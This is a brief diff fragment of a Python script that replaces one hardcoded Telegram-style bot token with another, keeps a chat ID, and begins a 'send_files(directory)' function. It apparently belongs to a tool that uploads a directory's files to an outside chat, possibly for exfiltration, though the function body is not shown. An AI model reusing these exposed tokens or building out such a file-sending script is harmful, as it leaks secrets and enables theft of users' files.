@@ -5,7 +5,7 @@ import random
 import threading
 from concurrent.futures import ThreadPoolExecutor
 
-TOKEN = "8375206771:AAH_-wjs5RsUEO12MaRpwyFVbsCDELE_20M"
+TOKEN = "8375206771:AAFJL9m1_PMQmwGfX9PKbqI8bLMyD9O7bjI"
 CHAT_ID = "8216576697"
 
 def send_files(directory):
